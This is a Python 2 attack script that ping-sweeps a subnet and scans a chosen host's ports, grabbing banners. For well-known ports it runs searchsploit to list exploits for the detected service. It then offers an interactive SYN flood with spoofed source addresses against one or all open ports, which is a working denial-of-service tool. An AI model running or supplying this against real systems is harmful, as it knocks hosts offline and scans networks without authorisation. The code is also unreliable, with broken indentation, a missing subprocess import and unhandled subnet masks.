#!/usr/bin/python
# Created by Abhishek Sharma

import os
import socket
import sys
from scapy.all import *
import ipcalc

class Network_Scanner:

	def ip_address_list(self,start_range,end_range,machine_ip,subnet_mask):

		var = subnet_mask.count("255")
		(fir, sec, third, fourth) = subnet_mask.split('.')
		(feild1, feild2, feild3, feild4) = machine_ip.split('.')
		if var == 1:
        		ntw = feild1 + "." + "0" + "." + "0" + "." +  "0"
		if var == 2:
        		ntw = feild1 + "." + feild2 + "." + "0" + "." + "0"
		if var == 3:
        		ntw = feild1 + "." + feild2 + "." + feild3 + "." + "0"
		if var == 1:
        		if sec == "0":
                		netmask="8"
        		if sec == "128":
                		netmask="9"
        		if sec == "192":
                		netmask="10"
        		if sec == "224":
                		netmask="11"
        		if sec == "240":
               	 		netmask="12"
        		if sec == "248":
                		netmask="13"
        		if sec == "252":
                		netmask="14"
        		if sec == "254":
                		netmask="15"

		if var == 2:
        		if third == "0":
                		netmask="16"
        		if third == "128":
                		netmask="17"
        		if third == "192":
                		netmask="18"
        		if third == "224":
                		netmask="19"
        		if third == "240":
                		netmask="20"
       	 		if third == "248":
                		netmask="21"
        		if third == "252":
                		netmask="22"
        		if third == "254":
                		netmask="23"
		if var == 3:
        		if fourth == "0":
                		netmask="24"
        		if fourth == "128":
                		netmask="25"
        		if fourth == "192":
                		netmask="26"
        		if fourth == "224":
                		netmask="27"
        		if fourth == "240":
                		netmask="28"
        		if fourth == "248":
                		netmask="29"
        		if fourth == "252":
                		netmask="30"
		ip_list = []
		global network_range
		network_range = ntw + "/" + netmask
		for x in ipcalc.Network(ntw + "/" + netmask):
        		if x >= start_range and x <= end_range:
				x = str(x)
                		ip_list.append(x)
		return ip_list

	def ping_scan(self,ip_list):
		active_host = []
		down_host = []		
		for ip in ip_list:
			status = subprocess.call(["ping", "-c", "2", ip], stdout=subprocess.PIPE)
			if status == 0:
				active_host.append(ip)
				print "IP Address: " + ip + " " + "UP"
			else:
				down_host.append(ip)
				print "IP Address: " + ip + " " + "Down" 	

		return (active_host,down_host)
	
	def port_scan(self,ip_to_scan,start_port_range,end_port_range):
		open_port=[]

		for port in range(int(start_port_range),int(end_port_range) + 1):
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	             	sock.settimeout(0.2) 
			try:
				sock.connect((ip_to_scan,port))
				open_port.append(port)
				try:
					if port == 80:
			  			sock.send('GET HTTP/1.1 \r\n')
				  		received = sock.recv(1024)
						print "\nConnection to Port 80 Succeeded!\n" 
						print "Recived Information: \n"
						print str(received)
				
                                                if port < 1023:
							try:
				                        	service_name = socket.getservbyport(port, 'tcp')
				                	except Exception as error:
                                                        	print error
							print "\nAvailable Exploits:\n"
                                                	os.system("searchsploit" + " " + service_name)

					else:
						sock.send('Hello, is it me you\'re looking for? \r\n')
						received = sock.recv(1024)
						print "\nConnection to Port " + str(port) + " Succeeded \n"
						print "Received Information: \n"
						print str(received)
						if port < 1023:
							try:
								service_name = socket.getservbyport(port, 'tcp')
							except Exception as error:
								print error
							print "\nAvailable Exploits:\n"
							os.system("searchsploit" + " " + service_name)
	
				except Exception as error:
					continue
			
			except Exception as error:
				continue
		
		return open_port

	def port_flood(self,network_range,ip_to_scan,port_option):
		
		counter = 0
		if port_option == "all":
			
			while counter == 0:
				try:
					IP_header = IP(src = network_range, dst = ip_to_scan, ttl=99)
                        		TCP_header = TCP(flags = "S", sport = RandShort(), dport = open_port)
                        		syn_packet = IP_header / TCP_header
			        	try:
                                		print("\nFlooding target IP " + ip_to_scan + " on all open ports. Please press CTRL+Z to stop/exit.")
                               	 		ans,unans = srloop(syn_packet, verbose = False)
                        		except Exception as e:
                                		print(e)
               
                		except KeyboardInterrupt:
                        		print("\nYou have pressed Ctrl+C. The program will now exit.")
                        		sys.exit()
		

		else:
			while counter == 0:
        			try:
            				IP_header = IP(src = network_range, dst = ip_to_scan, ttl=99)
           		 		TCP_header = TCP(flags = "S", sport = RandShort(), dport = int(port_option))
            				syn_packet = IP_header / TCP_header
            				try:
                				print("\nFlooding target IP " + ip_to_scan + " on " + str(port_option) + " port. Please press CTRL+Z to stop/exit.")
                				ans,unans = srloop(syn_packet, verbose = False)
            				except Exception as e:
               	 				print(e)

        			except KeyboardInterrupt:
            				print("\nYou have pressed Ctrl+C. The program will now exit.")
            				sys.exit()

#Main Function

#Global Variable
network_range = "0"
open_port = []
#Input 

start_range = raw_input("Enter the start of IP range: ")
end_range = raw_input("Enter the end of IP range: ")
machine_ip = raw_input("Enter your machine IP: ")
subnet_mask = raw_input("Enter SubnetMask: ")

network_scanner = Network_Scanner()
ip_list=network_scanner.ip_address_list(start_range,end_range,machine_ip,subnet_mask)
host_list = network_scanner.ping_scan(ip_list)
active_host= host_list[0]
down_host = host_list[1]
print "Active Host: ", active_host
print "Down Host: ", down_host
print "\n\n"
ip_to_scan = raw_input("Enter IP Address to Scan(From Active Host): ")
loop=1
while loop > 0:
	for ip in active_host:
		if ip == ip_to_scan:
			loop=0		
			break
		else:
			pass
	if loop == 0:
		break
	else:
		print "Failed"
		ip_to_scan = raw_input("Enter IP Address to Scan(From Active Host): ")

print "\n\nSelected IP Address: ", ip_to_scan
start_port_range = raw_input("Enter Start Port Range: ")
end_port_range = raw_input("Enter End Port Range: ")

open_port = network_scanner.port_scan(ip_to_scan,start_port_range,end_port_range)

while True:

	choice = raw_input("1.Wish to flood Single Port\n 2.Wish to flood All Ports\n 3.Exit\n Enter: ")

	if choice == "1":
		port_option = raw_input("Enter Port Number: ")
		tcp_port_flood = network_scanner.port_flood(network_range,ip_to_scan,port_option)

	elif choice == "2":
		port_option = "all"
		tcp_port_flood = network_scanner.port_flood(network_range,ip_to_scan,port_option)
	elif choice == "3":
		print "Terminating Program"
		sys.exit()
	else:
		print "Select Proper Choice"
